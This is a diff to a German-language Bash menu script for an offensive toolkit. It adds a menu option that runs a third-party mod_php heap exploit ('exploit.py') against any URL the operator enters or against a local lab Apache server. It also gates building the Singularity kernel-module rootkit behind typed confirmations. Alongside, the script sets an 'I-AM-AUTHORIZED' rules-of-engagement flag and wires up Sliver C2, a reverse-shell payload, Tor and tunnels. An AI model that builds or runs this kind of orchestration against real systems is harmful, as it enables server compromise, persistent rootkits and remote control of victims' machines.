@@ -78,7 +78,8 @@ cmd_run_wizard() {
   read -r -p "  Cloudflare Tunnel (Listener + Sliver HTTPS)? [j/N]: " tun
   read -r -p "  Lab-External (Tor+Tunnel web/sliver, nur Lab-IP)? [J/n]: " ext
   read -r -p "  Jackalsyn selftest? [J/n]: " js
-  echo "  Singularity: detect | lab (container) | full (build nur mit CONFIRM)"
+  read -r -p "  mod_php + Zer061 PoC (heap exploit.py)? [J/n]: " mp
+  echo "  Singularity: detect | lab | load (LKM container-build) | full"
   read -r -p "  Singularity-Modus [lab]: " sg
   sg="${sg:-lab}"
   echo
@@ -91,6 +92,7 @@ cmd_run_wizard() {
   echo "  Tunnel:       $([[ "$tun" =~ ^[jJ] ]] && echo on || echo off)"
   echo "  External:     $([[ "$ext" =~ ^[nN] ]] && echo auto || echo on)"
   echo "  Jackalsyn:    $([[ "$js" =~ ^[nN] ]] && echo off || echo auto)"
+  echo "  mod_php PoC:  $([[ "$mp" =~ ^[nN] ]] && echo off || echo auto)"
   echo "  Singularity:  ${sg:-lab}"
   echo "  Backend:      $(term_backend)"
   echo
@@ -100,16 +102,17 @@ cmd_run_wizard() {
   export CONFIRM_ROE=I-AM-AUTHORIZED
   export ENGAGE_LHOST="$lhost" ENGAGE_LPORT="$lport" TARGET_URL="$url"
   export ENGAGE_C2=sliver ENGAGE_RS=on ENGAGE_JACKALSYN=auto ENGAGE_SINGULARITY="${sg:-lab}"
-  export ENGAGE_FETCH_ALL=on ENGAGE_EXTERNAL=auto
+  export ENGAGE_FETCH_ALL=on ENGAGE_EXTERNAL=auto ENGAGE_MODPHP=auto
   [[ "$tor" =~ ^[jJ] ]] && export ENGAGE_TOR=on
   [[ "$c2" =~ ^[nN] ]] && export ENGAGE_C2=none
   [[ "$rs" =~ ^[nN] ]] && export ENGAGE_RS=off
   [[ "$tun" =~ ^[jJ] ]] && export ENGAGE_TUNNEL=on
   [[ "$ext" =~ ^[nN] ]] && export ENGAGE_EXTERNAL=off
   [[ "$js" =~ ^[nN] ]] && export ENGAGE_JACKALSYN=off
+  [[ "$mp" =~ ^[nN] ]] && export ENGAGE_MODPHP=off
   [[ "$sg" == "off" ]] && export ENGAGE_SINGULARITY=off
-  if [[ "$sg" == "full" ]]; then
-    read -r -p "  Singularity FULL braucht CONFIRM_SINGULARITY_ENGAGE=VM-REBOOT-OK — tippe VM-REBOOT-OK: " sconfirm
+  if [[ "$sg" == "load" || "$sg" == "full" ]]; then
+    read -r -p "  Singularity LOAD braucht CONFIRM — tippe VM-REBOOT-OK: " sconfirm
     [[ "$sconfirm" == "VM-REBOOT-OK" ]] && export CONFIRM_SINGULARITY_ENGAGE=VM-REBOOT-OK
   fi
   bash "$ORCH" run "$url"
@@ -223,7 +226,7 @@ cmd_singularity_ops() {
     [3] detect (Blue Team, read-only)
     [4] Runtime wählen (vm/host/container)
     [5] container-up (privileged)
-    [6] container-build (CONFIRM_SINGULARITY_CONTAINER=…)
+    [6] LOAD — container-build (setup/LKM, VM-REBOOT-OK + I_UNDERSTAND_REBOOT)
     [7] container-shell (interaktiv)
     [8] host-check / host-build (Gefahr Host!)
     [9] vm-wizard / vm-up
@@ -236,10 +239,53 @@ SUB
     3) bash "$ROOT/scripts/lab-singularity.sh" detect ;;
     4) bash "$ROOT/scripts/lab-singularity.sh" runtime ;;
     5) bash "$ROOT/scripts/lab-singularity.sh" container-up ;;
-    6) bash "$ROOT/scripts/lab-singularity.sh" container-build ;;
+    6)
+      read -r -p "  LOAD nur Lab/VM — tippe VM-REBOOT-OK: " sconfirm
+      if [[ "$sconfirm" == "VM-REBOOT-OK" ]]; then
+        CONFIRM_SINGULARITY_ENGAGE=VM-REBOOT-OK CONFIRM_SINGULARITY_CONTAINER=I_UNDERSTAND_REBOOT \
+          bash "$ROOT/scripts/lab-singularity.sh" container-build
+      else
+        echo "  Abgebrochen."
+      fi
+      ;;
     7) bash "$ROOT/scripts/lab-singularity.sh" container-shell ;;
     8) bash "$ROOT/scripts/lab-singularity.sh" host-check; bash "$ROOT/scripts/lab-singularity.sh" host-build ;;
     9) bash "$ROOT/scripts/lab-singularity.sh" vm-wizard; bash "$ROOT/scripts/lab-singularity.sh" vm-up ;;
+  esac
+  read -r -p "  ENTER für Menü… " _
+}
+
+cmd_modphp_ops() {
+  hdr
+  cat <<'SUB'
+  ── mod_php + PoC (Zer061 heap / exploit.py) ──
+    [1] fetch-zer061 (Bundle)
+    [2] PoC gegen URL (aus Scope/Wizard)
+    [3] Lab: apache-up + PoC :19288
+    [0] Zurück
+SUB
+  read -r -p "  Auswahl: " c
+  case "$c" in
+    1) bash "$ROOT/scripts/fetch-zer061.sh" ;;
+    2)
+      read -r -p "  Ziel-URL (mod_php): " url
+      if [[ -n "$url" ]]; then
+        kit="$ROOT/third_party/zer061-php2shell/exploit.py"
+        if [[ -f "$kit" ]]; then
+          python3 "$kit" -u "$url"
+        else
+          echo "  Kit fehlt — [1] fetch"
+        fi
+      fi
+      ;;
+    3)
+      bash "$ROOT/scripts/fetch-zer061.sh" 2>/dev/null || true
+      bash "$ROOT/scripts/lab-apache-up.sh"
+      kit="$ROOT/third_party/zer061-php2shell/exploit.py"
+      if [[ -f "$kit" ]]; then
+        python3 "$kit" -u "http://127.0.0.1:19288/index.php"
+      fi
+      ;;
   esac
   read -r -p "  ENTER für Menü… " _
 }
@@ -279,8 +325,9 @@ main_loop() {
     [7] Reverse-Shell RAAS       lukechilds-Payload ziehen + Listener
     [8] Unterprojekte            Kits: vorhanden / fehlend (Sliver, Tor, RAAS, …)
     [9] Sliver (Post-Ex)         status · operator · listener · https · console · stage · down
-    [a] Singularity              status · detect · runtime · container · build · host · vm
+    [a] Singularity              status · detect · LOAD (container-build) · host · vm
     [b] Lab-External             up [--tor] · status · down · URLs (nur Lab-Target)
+    [c] mod_php + PoC            fetch-zer061 · exploit.py · lab apache :19288
     [0] Zurück
 
 MENU
@@ -297,6 +344,7 @@ MENU
       9) cmd_sliver_ops ;;
       a|A) cmd_singularity_ops ;;
       b|B) cmd_external_ops ;;
+      c|C) cmd_modphp_ops ;;
       0|q|"") return 0 ;;
     esac
   done
